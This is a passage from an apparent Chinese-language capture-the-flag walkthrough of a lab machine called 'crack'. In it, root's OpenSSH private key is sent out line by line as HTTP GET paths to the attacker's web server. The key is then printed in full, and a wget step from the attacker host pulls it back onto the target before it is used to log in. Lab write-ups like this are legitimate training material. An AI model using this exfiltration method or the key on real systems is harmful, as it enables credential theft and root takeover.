<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /randomfile1 HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /frand2 HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /-----BEGIN HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1"</span> <span class="token number">404</span> -
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> code <span class="token number">404</span>, message File not found
<span class="token number">192.168</span>.56.165 - - <span class="token punctuation">[</span><span class="token number">27</span>/Apr/2024 <span class="token number">21</span>:58:54<span class="token punctuation">]</span> <span class="token string">"GET /-----END HTTP/1.1"</span> <span class="token number">404</span> -</code></pre>
<p>root的私钥泄露出来了，整理一下<br>—–BEGIN OPENSSH PRIVATE KEY—–<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn<br>b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt<br>xNQ8NxRO4&#x2F;bC1v90lUrhyLi&#x2F;ML5B4nak+5vLFJi8NlwXMQJ&#x2F;xCWZg5+WOLduFp4VvHlwAf<br>tDh2C+tJp2hqusW1jZRqSXspCfKLPt&#x2F;v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k<br>&#x2F;+FwJbMna8iPwmvK6n&#x2F;2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu<br>yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl<br>Kn2aZN&#x2F;8xWAB+&#x2F;t96TcXogtSbQw&#x2F;eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3&#x2F;Cb34a&#x2F;6v8c<br>9rMjGl9HMZFDwswzAGrvPOeroVB&#x2F;TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2<br>EAAAGBAMQb0XtxB+u8vYyLdq8Gu&#x2F;bbzw8Jm9lpmL&#x2F;HMz5+G4EgqRZoQ8h8J29CFMssN4j0<br>Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2<br>wtb&#x2F;dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado<br>arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP&#x2F;hcCWzJ2vI<br>j8Jryup&#x2F;9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn<br>b2FK7qDomlEWLqc7scNuUWqNEm&#x2F;J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf&#x2F;MVg<br>Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN&#x2F;wm9+Gv+r&#x2F;HPazIxpfRzGR<br>Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg<br>3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh&#x2F;VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2<br>m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa&#x2F;<br>a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR&#x2F;3uSMN<br>peiKDzLI&#x2F;Y+QcQku&#x2F;7GmUIV4ugP0fjMnz&#x2F;XcXqe6GVNX&#x2F;gvNeT6WfKPCzcaXiF4I2i228u<br>TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG<br>TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf&#x2F;yUyK04a6mhFg3kJzsxE+iDOVH28D<br>Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA<br>wQDlr9NWE6q1BovNNobebvw44NdBRQE&#x2F;1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo<br>0MoSXZXiC&#x2F;0&#x2F;CSfe6Je7unnIzhiA85jSe&#x2F;u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO<br>1ROwaN5uL26gIgtf&#x2F;Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP<br>WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo<br>0sTQ3d&#x2F;kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr<br>DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1<br>Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl<br>&#x2F;RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh<br>oxY6YRERurpcyYuSa&#x2F;rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq<br>2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf<br>6xpD9lHWyp+ocD&#x2F;meYC7V8aio&#x2F;W9VxL25NlYwdFyCgecd&#x2F;rIJQ+tGPXoqXIKrf5lVrVtFC<br>s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s&#x3D;<br>—–END OPENSSH PRIVATE KEY—–</p>
<p>传到靶机然后登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">cris@crack:~$ <span class="token function">wget</span> http://192.168.56.104:6677/ssh.txt
--2024-04-27 <span class="token number">16</span>:02:35--  http://192.168.56.104:6677/ssh.txt
Conectando con <span class="token number">192.168</span>.56.104:6677<span class="token punctuation">..</span>. conectado.
Petición HTTP enviada, esperando respuesta<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Longitud: <span class="token number">2592</span> <span class="token punctuation">(</span><span class="token number">2</span>,5K<span class="token punctuation">)</span> <span class="token punctuation">[</span>text/plain<span class="token punctuation">]</span>
Grabando a: «ssh.txt»

ssh.txt                                            <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span><span class="token punctuation">]</span>   <span class="token number">2</span>,53K  --.-KB/s    en 0s      

<span class="token number">2024</span>-04-27 <span class="token number">16</span>:02:35 <span class="token punctuation">(</span><span class="token number">444</span> MB/s<span class="token punctuation">)</span> - «ssh.txt» guardado <span class="token punctuation">[</span><span class="token number">2592</span>/2592<span class="token punctuation">]</span>

cris@crack:~$ <span class="token function">chmod</span> <span class="token number">600</span> ssh.txt
